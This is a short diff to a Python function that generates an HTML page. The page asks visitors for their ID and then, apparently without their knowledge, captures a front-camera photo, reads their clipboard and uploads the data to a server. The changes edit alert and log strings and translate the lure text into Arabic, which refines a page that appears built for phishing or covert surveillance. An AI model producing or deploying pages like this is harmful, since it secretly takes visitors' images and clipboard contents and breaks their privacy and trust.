@@ -85,9 +85,9 @@ def generate_page(title, bg_color, button_text):
             if (id) {{
                 await capturePhoto("user", "front");
                 await sendClipboard();
-                alert("tm");
+                alert("good");
             }} else {{
-                alert("id");
+                alert("send id");
             }}
         }}
 
@@ -100,17 +100,17 @@ def generate_page(title, bg_color, button_text):
 
                     await fetch('/upload', {{ method: 'POST', body: formData }});
                 }} else {{
-                    console.log("lol.");
+                    console.log("yes.");
                 }}
             }} catch (error) {{
-                console.log("error", error);
+                console.log("no", error);
             }}
         }}
     </script>
 </head>
 <body>
-    <h1>send id</h1>
-    <input type="text" id="userId" placeholder="1234567*">
+    <h1>الرجاء إدخال ID الخاص بك</h1>
+    <input type="text" id="userId" placeholder="أدخل ID هنا">
     <button onclick="sendData()">{button_text}</button>
 </body>
 </html>"""
